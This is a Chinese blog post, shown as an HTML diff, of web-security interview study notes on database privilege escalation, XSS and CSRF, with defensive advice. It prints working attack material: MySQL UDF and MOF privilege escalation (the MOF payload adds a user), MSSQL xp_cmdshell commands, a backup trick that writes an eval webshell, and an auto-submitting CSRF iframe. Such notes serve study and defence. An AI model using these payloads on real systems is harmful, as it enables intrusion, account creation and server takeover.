@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <link rel="dns-prefetch" href="https://doggy-test.github.io">
+  <title>web安全知识补充(一) | Doggy的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="针对 https://lc4t.github.io/2017/03/06/web-security-interview/ ,文章已经写得很全了，添加点自己的东西,顺便搬过来一些(万一他网站挂了==)。想到哪里写哪里好了，留待自己实习或者秋招面试前复习下。 很多类型的洞自己也没实践过，只是理论，所以难免理解有所偏差甚至错误。随着知识的加深，会稍作更改  关于mysql提权UDF提权，目录位置 针对">
+<meta name="keywords" content="安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web安全知识补充(一)">
+<meta property="og:url" content="https://doggy-test.github.io/2017/05/03/web安全知识补充-一/index.html">
+<meta property="og:site_name" content="Doggy的博客">
+<meta property="og:description" content="针对 https://lc4t.github.io/2017/03/06/web-security-interview/ ,文章已经写得很全了，添加点自己的东西,顺便搬过来一些(万一他网站挂了==)。想到哪里写哪里好了，留待自己实习或者秋招面试前复习下。 很多类型的洞自己也没实践过，只是理论，所以难免理解有所偏差甚至错误。随着知识的加深，会稍作更改  关于mysql提权UDF提权，目录位置 针对">
+<meta property="og:image" content="http://i4.buimg.com/567571/8a0198be9e6ce5ba.jpg">
+<meta property="og:updated_time" content="2017-05-02T19:55:44.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="web安全知识补充(一)">
+<meta name="twitter:description" content="针对 https://lc4t.github.io/2017/03/06/web-security-interview/ ,文章已经写得很全了，添加点自己的东西,顺便搬过来一些(万一他网站挂了==)。想到哪里写哪里好了，留待自己实习或者秋招面试前复习下。 很多类型的洞自己也没实践过，只是理论，所以难免理解有所偏差甚至错误。随着知识的加深，会稍作更改  关于mysql提权UDF提权，目录位置 针对">
+<meta name="twitter:image" content="http://i4.buimg.com/567571/8a0198be9e6ce5ba.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="Doggy的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" type="text/css" href="/./main.05aabf.css">
+  <style type="text/css">
+  
+    #container.show {
+      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
+    }
+  </style>
+  
+
+  
+
+</head>
+
+<body>
+  <div id="container" q-class="show:isCtnShow">
+    <canvas id="anm-canvas" class="anm-canvas"></canvas>
+    <div class="left-col" q-class="show:isShow">
+      
+<div class="overlay" style="background: #4d4d4d"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			<img src="https://www.t00ls.net/uc_server/data/avatar/000/00/78/10_avatar_middle.jpg" class="js-avatar">
+		</a>
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Doggy</a></h1>
+		</hgroup>
+		
+		<p class="header-subtitle">热爱生活，热爱安全</p>
+		
+
+		<nav class="header-menu">
+			<ul>
+			
+				<li><a href="/">主页</a></li>
+	        
+				<li><a href="/categories/日记/">日记</a></li>
+	        
+			</ul>
+		</nav>
+		<nav class="header-smart-menu">
+    		
+    			
+    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
+    			
+            
+    			
+    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
+    			
+            
+		</nav>
+		<nav class="header-nav">
+			<div class="social">
+				
+					<a class="github" target="_blank" href="https://github.com/wenxiangcai" title="github"><i class="icon-github"></i></a>
+		        
+					<a class="mail" target="_blank" href="mailto:1129061128@qq.com" title="mail"><i class="icon-mail"></i></a>
+		        
+			</div>
+		</nav>
+	</header>		
+</div>
+
+    </div>
+    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
+      
+<nav id="mobile-nav">
+  	<div class="overlay js-overlay" style="background: #4d4d4d"></div>
+	<div class="btnctn js-mobile-btnctn">
+  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
+	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img src="https://www.t00ls.net/uc_server/data/avatar/000/00/78/10_avatar_middle.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author js-header-author">Doggy</h1>
+			</hgroup>
+			
+			<p class="header-subtitle"><i class="icon icon-quo-left"></i>热爱生活，热爱安全<i class="icon icon-quo-right"></i></p>
+			
+			
+			
+				
+			
+				
+			
+			
+			
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/wenxiangcai" title="github"><i class="icon-github"></i></a>
+			        
+						<a class="mail" target="_blank" href="mailto:1129061128@qq.com" title="mail"><i class="icon-mail"></i></a>
+			        
+				</div>
+			</nav>
+
+			<nav class="header-menu js-header-menu">
+				<ul style="width: 50%">
+				
+				
+					<li style="width: 50%"><a href="/">主页</a></li>
+		        
+					<li style="width: 50%"><a href="/categories/日记/">日记</a></li>
+		        
+				</ul>
+			</nav>
+		</header>				
+	</div>
+	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
+</nav>
+
+      <div id="wrapper" class="body-wrap">
+        <div class="menu-l">
+          <div class="canvas-wrap">
+            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
+          </div>
+          <div id="js-content" class="content-ll">
+            <article id="post-web安全知识补充-一" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      web安全知识补充(一)
+    </h1>
+  
+
+        
+        <a href="/2017/05/03/web安全知识补充-一/" class="archive-article-date">
+  	<time datetime="2017-05-02T19:40:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-03</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>针对 <a href="https://lc4t.github.io/2017/03/06/web-security-interview/" target="_blank" rel="external">https://lc4t.github.io/2017/03/06/web-security-interview/</a> ,文章已经写得很全了，添加点自己的东西,顺便搬过来一些(万一他网站挂了==)。想到哪里写哪里好了，留待自己实习或者秋招面试前复习下。</p>
+<p>很多类型的洞自己也没实践过，只是理论，所以难免理解有所偏差甚至错误。随着知识的加深，会稍作更改</p>
+</blockquote>
+<h2 id="关于mysql提权"><a href="#关于mysql提权" class="headerlink" title="关于mysql提权"></a>关于mysql提权</h2><p>UDF提权，目录位置</p>
+<p>针对windows,数据库版本为 5.0 以下的我们要将udf.dll文件导出在 C:\Windows\udf.dll 下,5.0-5.1间要在C:\windows\systems32下,而&gt;5.1的版本需要在mysql安装目录下的plugin目录下进行上传。</p>
+<a id="more"></a>
+<p>上传udf的代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">show variables like ‘%plugin%’;</div><div class="line">plugin_dir: /usr/bin/mysql/plugin	(need rw)</div><div class="line">uname -a</div><div class="line">select hex(load_file(‘/pentest/database/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so’)) into outfile ‘/tmp/udf.txt’;</div><div class="line">select unhex(‘7F454C46020…’) into dumpfile ‘/usr/lib/mysql/plugin/mysqludf.so’;</div><div class="line">nm -D /usr/lib/mysql/plugin/mysqludf.so</div><div class="line">create function sys_eval returns string soname “mysqludf.so”;</div><div class="line">select sys_eval(‘whoami’);</div></pre></td></tr></table></figure></p>
+<p>原理:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">利用了root 高权限，创建带有调用cmd的函数的udf.dll动态链接库,从而利用system权限进行提权操作</div></pre></td></tr></table></figure></p>
+<p>mof提权，需要写目录上传权限<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> namespace(<span class="meta-string">"\\\\.\\root\\subscription"</span>)</span></div><div class="line">instance of __EventFilter as $EventFilter</div><div class="line">&#123;</div><div class="line">    EventNamespace = <span class="string">"Root\\Cimv2"</span>;</div><div class="line">    Name  = <span class="string">"filtP2"</span>;</div><div class="line">    Query = <span class="string">"Select * From __InstanceModificationEvent "</span></div><div class="line">            <span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span></div><div class="line">            <span class="string">"And TargetInstance.Second = 5"</span>;</div><div class="line">    QueryLanguage = <span class="string">"WQL"</span>;</div><div class="line">&#125;;</div><div class="line">instance of ActiveScriptEventConsumer as $Consumer</div><div class="line">&#123;</div><div class="line">    Name = <span class="string">"consPCSV2"</span>;</div><div class="line">    ScriptingEngine = <span class="string">"JScript"</span>;</div><div class="line">    ScriptText =</div><div class="line">    <span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user [username] [password] /add\")"</span>;</div><div class="line">&#125;;</div><div class="line">instance of __FilterToConsumerBinding</div><div class="line">&#123;</div><div class="line">    Consumer   = $Consumer;</div><div class="line">    Filter = $EventFilter;</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
+<p>不过mof只能在windows有效，并且需要上传在c:/windows/system32/wbem/mof/目录下.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select load_file(&apos;C:/wmpub/nullevt.mof&apos;) into dumpfile </div><div class="line">&apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;</div></pre></td></tr></table></figure></p>
+<p>原理(百度来的):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做&quot;托管对象格式&quot;其作用是每隔五秒就会去监控进程创建和死亡。</div><div class="line">其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，</div><div class="line">这个vbs大多数的是cmd的添加管理员用户的命令。</div></pre></td></tr></table></figure></p>
+<p><strong>另外提一下mysq注入写入shell，需要两个条件</strong></p>
+<ul>
+<li>网站根路径</li>
+<li>拥有写权限，且文件夹可写</li>
+</ul>
+<p>在缺少第一个条件的情况下，需要知道网站根路径，可以采取类似爆破网站路径以及配置文件路径的方式，或者查看是否存在phpinfo界面以及报错泄露根路径。</p>
+<p>在缺少第二个条件的情况下，<br>如果是secure-file-priv为off，且在phpmyadmin下,可以用日志包含的方式写入shell,具体方法:<a href="http://blog.csdn.net/yizhou35/article/details/12162513" target="_blank" rel="external">http://blog.csdn.net/yizhou35/article/details/12162513</a><br>，或者尝试自己添加file权限[PS:mysql权限管理:这篇文章写得还行 <a href="http://www.cnblogs.com/Richardzhu/p/3318595.html" target="_blank" rel="external">http://www.cnblogs.com/Richardzhu/p/3318595.html</a>]</p>
+<p><strong>如果sql注入中过滤了引号，是否可以进行读写</strong></p>
+<p>读可以，但写不行。</p>
+<p>原因:读文件可以使用hex()方式绕过引号，但写文件out_file’’的引号不可忽略</p>
+<h2 id="mssql提权"><a href="#mssql提权" class="headerlink" title="mssql提权"></a>mssql提权</h2><p>原理:在没降权的情况下,MSSQL的服务是以system权限运行的.但如果mssql服务是以users组或者guests组降权运行的话,会导致下面一系列的操作进行不了.</p>
+<p>mssql提权相对轻松，利用XP_CMDSHELL,Sp_OACreate等储存过程直接提权.(前提储存过程健在).</p>
+<p>由于ActiveX的支持，你能在SQL Server中使用VBS/WSH<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">declare @o int exec sp_oacreate &apos;wscript.shell&apos;, @o out exec sp_oamethod @o, &apos;run&apos;, NULL, &apos;notepad.exe&apos;</div><div class="line"></div><div class="line">Username: &apos;; declare @o int exec sp_oacreate &apos;wscript.shell&apos;, @o out exec sp_oamethod @o, &apos;run&apos;, NULL, &apos;notepad.exe&apos; --</div></pre></td></tr></table></figure></p>
+<p>执行系统命令，xp_cmdshell(S)，SQL Server 2005默认是关闭的。你需要admin权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">EXEC master.dbo.xp_cmdshell &apos;cmd.exe dir c:&apos;</div><div class="line">用ping简单的测试一下，用之前先检查一下防火墙和嗅探器</div><div class="line">EXEC master.dbo.xp_cmdshell &apos;ping &apos;</div><div class="line">如果有错误，或者union或者其他的什么，你都不能直接读到结果。</div></pre></td></tr></table></figure></p>
+<p>如果用户拥有管理员sa权限则可以用sp_configure重修开启它。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">EXEC sp_configure &apos;show advanced options&apos;,1//允许修改高级参数</div><div class="line">RECONFIGURE</div><div class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1  //打开xp_cmdshell扩展</div><div class="line">RECONFIGURE</div></pre></td></tr></table></figure></p>
+<p>SQL Server中的一些特殊的表(S)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Error Messages</div><div class="line">master..sysmessages</div><div class="line">Linked Servers</div><div class="line">master..sysservers</div><div class="line">Password (2000和2005版本的都能被破解，这俩的加密算法很相似)</div><div class="line">SQL Server 2000: masters..sysxlogins</div><div class="line">SQL Server 2005 : sys.sql_logins</div></pre></td></tr></table></figure></p>
+<p>SQL Server的其它内置程序(S)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">命令执行 (xp_cmdshell)</div><div class="line">exec master..xp_cmdshell &apos;dir&apos;</div><div class="line">注册表操作 (xp_regread)</div><div class="line">xp_regaddmultistring</div><div class="line">xp_regdeletekey</div><div class="line">xp_regdeletevalue</div><div class="line">xp_regenumkeys</div><div class="line">xp_regenumvalues</div><div class="line">xp_regread</div><div class="line">xp_regremovemultistring</div><div class="line">xp_regwrite</div><div class="line">exec xp_regread HKEY_LOCAL_MACHINE, &apos;SYSTEM\CurrentControlSet \Services\lanmanserver\parameters&apos;, &apos;nullsessionshares&apos; exec xp_regenumvalues HKEY_LOCAL_MACHINE, &apos;SYSTEM \CurrentControlSet \Services\snmp\parameters\validcommunities&apos;</div><div class="line">管理服务(xp_servicecontrol)</div><div class="line">媒体(xp_availablemedia)</div><div class="line">ODBC 资源 (xp_enumdsn)</div><div class="line">登录 (xp_loginconfig)</div><div class="line">创建Cab文件 (xp_makecab)</div><div class="line">域名列举 (xp_ntsec_enumdomains)</div><div class="line">杀进程 (need PID) (xp_terminate_process)</div><div class="line">新建进程 (实际上你想干嘛都行)</div><div class="line">sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ exec xp_webserver</div><div class="line">写文件进UNC或者内部路径 (sp_makewebtask)</div></pre></td></tr></table></figure></p>
+<p><strong>mssql差异备份拿shell</strong></p>
+<p>几条命令，就是通过备份数据库的方式将文件写入网站目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">alter/**/database/**/[Hospital]/**/set/**/recovery/**/full--</div><div class="line">declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/database/**/[Hospital]/**/to/**/disk=@d/**/with/**/init--</div><div class="line">drop/**/table/**/[itpro]--</div><div class="line">create/**/table/**/[itpro]([a]/**/image)--</div><div class="line">declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[Hospital]/**/to/**/disk=@d/**/with/**/init--</div><div class="line">insert/**/into/**/[itpro]([a])/**/values(0x3C25657865637574652872657175657374282261222929253EDA)--declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x65003A005C007700650062005C007A002E00610073007000/**/backup/**/log/**/[Hospital]/**/to/**/disk=@d/**/with/**/init--</div><div class="line">drop/**/table/**/[itpro]--</div><div class="line">declare/**/@d/**/nvarchar(4000)/**/select/**/@d=0x640062006200610063006B00/**/backup/**/log/**/[Hospital]/**/to/**/disk=@d/**/with/**/init--</div></pre></td></tr></table></figure></p>
+<p>其中红色的“Hospital”既是数据库名，这个要根据自己的情况来修改，然后黄色的“0x3C25657865637574652872657175657374282261222929253EDA”是一句话“&lt;%eval request(“a”)%&gt;”的内容，橙色的“0x65003A005C007700650062005C007A002E00610073007000”为备份的路径”e:webz.asp”</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>一般而言，存在4类:</p>
+<p><strong>反射型XSS：依赖用户行为触发</strong></p>
+<p>Hacker——发现存在反射XSS的URL——根据输出点的环境构造XSS代码——进行编码、缩短(可有可无，是为了增加迷惑性)——发送给受害人——受害打开后，执行XSS代码——完成hacker想要的功能(获取cookies、url、浏览器信息、IP等等)</p>
+<p><strong>存储型XSS：自动触发</strong></p>
+<p>储蓄型XSS其实和反射型XSS差不多，只是储蓄型把数据保存到服务端，而反射型只是让XSS游走在客户端上。下面是我在某处网站上检测到的储蓄XSS</p>
+<p><strong>DOMXSS：依赖用户行为，DOM发生变化, 也有反射存储</strong></p>
+<p>DOM XSS是基于在js上的。而且他不需要与服务端进行交互，像反射、储蓄都需要服务端的反馈来构造xss，因为服务端对我们是不可见的</p>
+<p><strong>FLASH XSS</strong></p>
+<p>由于flash是可以内嵌执行js代码，所以还存在一种flashxss漏洞</p>
+<blockquote>
+<p>针对前端，还有很多不熟悉的地方，需要多学习。</p>
+</blockquote>
+<p>总结的挺全了,关于DOM XSS和反射型、存储型的区别在于它不依赖与服务器端的响应，而是由js解析dom树后输出在html页面中,相比反射型而言危害更大,因为它可以直接绕过浏览器防护。</p>
+<p>另说到浏览器防护，就得提一提CSP</p>
+<p><strong>CSP</strong></p>
+<p><a href="http://lorexxar.cn/2016/08/08/ccsp/" target="_blank" rel="external">http://lorexxar.cn/2016/08/08/ccsp/</a> 这篇文章的大佬说的相当清楚，CSP写在header处用于浏览器识别防护。另外bypass的方式很多，根据具体情况而定，在这个大佬的博客里也介绍了很多。实战还没挖过这种漏洞，所以也只是理论基础==</p>
+<p><strong>对抗XSS</strong></p>
+<ol>
+<li>HTTP Only/ip绑定cookie</li>
+<li>过滤输入(filter,服务端，htmkentities,htmlspecialchars,)和输出(转义、编码)</li>
+<li>设置新的Cookie标志?</li>
+<li>设置一个HTTP标头?</li>
+<li>(dom)输出到script时，做jsencode，document.write时，如果输出到事件或脚本，做jsencode，如果输出到html内容或属性，做htmlencode</li>
+</ol>
+<p><strong>技巧</strong></p>
+<p><a href="http://www.freebuf.com/articles/web/20282.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/20282.html</a></p>
+<ol>
+<li>大小写、字符编码绕过(字符实体,String.fromCharCode)</li>
+<li>注释符打通</li>
+<li>标签过滤不全，标签绕过</li>
+<li>事件后跟location来绕过编码</li>
+<li>事件过滤不全，事件绕过</li>
+</ol>
+<p><strong>针对ip的过滤</strong></p>
+<ol>
+<li>进制转换(10进制,8进制)</li>
+<li>url特性:<a href="http://www.baidu.com@10.10.10.10和http://10.10.10.10其实一样" target="_blank" rel="external">http://www.baidu.com@10.10.10.10和http://10.10.10.10其实一样</a></li>
+<li>xip.io绕过</li>
+<li>。兼容</li>
+<li>302跳转</li>
+</ol>
+<p><strong>XSS能用来干什么</strong></p>
+<ol>
+<li>获取cookie</li>
+<li>GET/POST操作</li>
+<li>钓鱼（伪造一个登录框）</li>
+<li>获取浏览器（UA、插件）和系统信息（OS、控件）</li>
+<li>css history hack</li>
+<li>结合其他环境（java）获取信息，例如ip</li>
+<li>WORM:感染+传播</li>
+<li>xss shell: 结合csrf</li>
+<li>xss: 攻击客户端(js爆破缓存目录、下载、执行木马)</li>
+</ol>
+<p><strong>XSS防御策略</strong></p>
+<p>针对反射型、存储型和DOM型存在不同的防御措施</p>
+<p><strong>dom型的防御</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">输出到script时，做jsencode，document.write时，如果输出到事件或脚本，做jsencode，如果输出到html内容或属性，做htmlencode</div></pre></td></tr></table></figure></p>
+<p><strong>另两种</strong></p>
+<p>白名单、黑名单限制+输入输出字符编码</p>
+<p>编码样式为:</p>
+<p>(<a href="http://www.freebuf.com/articles/web/9977.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/9977.html</a>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</div><div class="line">2.在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</div><div class="line">3.在事件中输出，需要进行javascriptencode</div><div class="line">4.在css中输出，用encodeForCSS()函数</div><div class="line">5.在地址中输出，先检查是否http防止伪协议绕过，另做urlencode</div><div class="line">6.使用富文本时，使用XSS规则引擎进行编码过滤</div></pre></td></tr></table></figure></p>
+<p><strong>XSS worm原理</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. Ajax</div><div class="line">2. 攻击者发现目标网站存在XSS漏洞，并且可以编写 XSS 蠕虫。</div><div class="line">3. 利用宿主 （如博客空间） 作为传播源头进行 XSS 攻击。</div><div class="line">4. 当其他用户访问被感染的空间时，XSS 蠕虫就继续感染。</div></pre></td></tr></table></figure></p>
+<p><strong>绕过同源策略的方式</strong></p>
+<p>(<a href="http://www.cnblogs.com/2050/p/3191744.html" target="_blank" rel="external">http://www.cnblogs.com/2050/p/3191744.html</a>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1. document.domain(跨子域)</div><div class="line">2. JSONP(callback方式跨域传递JSON数据)</div><div class="line">3. CORS(AJAX跨域方法)</div><div class="line">4. window.name跨域</div><div class="line">5. window.postMessage跨域传送</div><div class="line">6. crossdomain.xml(Flash跨域)</div><div class="line">7. location.hash</div><div class="line">8. cookie的domain属性(子域向父域传递cookie信息)</div></pre></td></tr></table></figure></p>
+<p>另几个不是很熟，就不记录了==</p>
+<p><strong>Cookie有哪些参数，Secure什么用</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">secure： 仅在HTTPS使用</div><div class="line">HTTP Only： 防止客户端(js)访问</div><div class="line">SameSite=Lax(仅POST禁止)/Strict(GET也不允许跨域传送Cookie)</div><div class="line">expire: 规定 cookie 的有效期</div></pre></td></tr></table></figure></p>
+<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>参数可以被攻击者预测</p>
+<ol>
+<li>用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A</li>
+<li>在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A<br>用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B</li>
+<li>网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；<br>浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。</li>
+</ol>
+<p>用一张图片可以表示<br><img src="http://i4.buimg.com/567571/8a0198be9e6ce5ba.jpg" alt=""><br><strong>CSRF种类</strong></p>
+<ol>
+<li>GET/POST方式</li>
+<li>JSON Hijacking(通过构造callback从某个jsonp接口获得用户的json数据信息)</li>
+</ol>
+<p>(<a href="http://static.hx99.net/static/drops/web-15556.html" target="_blank" rel="external">http://static.hx99.net/static/drops/web-15556.html</a>)</p>
+<ol>
+<li>FLASH CSRF</li>
+</ol>
+<p>(<a href="http://static.hx99.net/static/drops/tips-2031.html" target="_blank" rel="external">http://static.hx99.net/static/drops/tips-2031.html</a><br><a href="https://blog.nuptzj.cn/post/134" target="_blank" rel="external">https://blog.nuptzj.cn/post/134</a>)<br>[利用jsonp或上传swf进行csrf])</p>
+<p><strong>CSRF的防范以及存在的缺陷</strong></p>
+<p>(不完全解决)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">当用户关闭页面时，清除session；设置低时效session</div><div class="line">(不能解决打开标签页后再打开伪造请求页造成的csrf)</div></pre></td></tr></table></figure></p>
+<p>(不完全解决)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">检查referer是否是本站</div><div class="line">(不能解决跨协议空referer)</div></pre></td></tr></table></figure></p>
+<p>CSRF 如何不带Referer访问,绕过Referer</p>
+<p>跨协议时referer为空,例如data://<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHA6Ly9hLmIuY29tL2Q+PGlucHV0IHR5cGU9dGV4dCBuYW1lPSdpZCcgdmFsdWU9JzEyMycvPjwvZm9ybT48c2NyaXB0PmRvY3VtZW50LmZvcm1zWzBdLnN1Ym1pdCgpOzwvc2NyaXB0Pg=="</span>&gt;</span></div><div class="line">base64为<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">http://a.b.com/d</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">'id'</span> <span class="attr">value</span>=<span class="string">'123'</span>/&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">document.forms[0].submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>另referer可能白名单限制不严，导致referer的绕过</p>
+<p>(不完全解决/简单)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">当表单提交时向form设置隐藏token,同表单一起post后验证</div><div class="line">(token可能被xss获取)</div></pre></td></tr></table></figure></p>
+<p>(复杂)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">对每个敏感信息获取请求增加验证码</div><div class="line">(极其影响用户体验)</div></pre></td></tr></table></figure></p>
+<p>(防止JSON HiJacking)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">在json数据头部加入while(1)</div><div class="line">原理:让攻击代码会陷入死循环中，无法将敏感信息发送到攻击者的服务器上，这样就防止了信息泄露；而正常的客户端代码可以正确地处理返回的JSON数据，</div><div class="line">它可以先将“while(1);”去掉再正常处理。</div></pre></td></tr></table></figure></p>
+<p>(HTTP-Headers)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在http头/协议层添加token验证[JS一般无法获得header处的token信息]</div></pre></td></tr></table></figure></p>
+<p><strong>CSRF的危害</strong></p>
+<ol>
+<li>篡改目标网站上的用户数据；</li>
+<li>盗取用户隐私数据；</li>
+<li>作为其他攻击向量的辅助攻击手法；</li>
+<li>传播CSRF蠕虫。</li>
+<li>结合xss造成更大的危害</li>
+</ol>
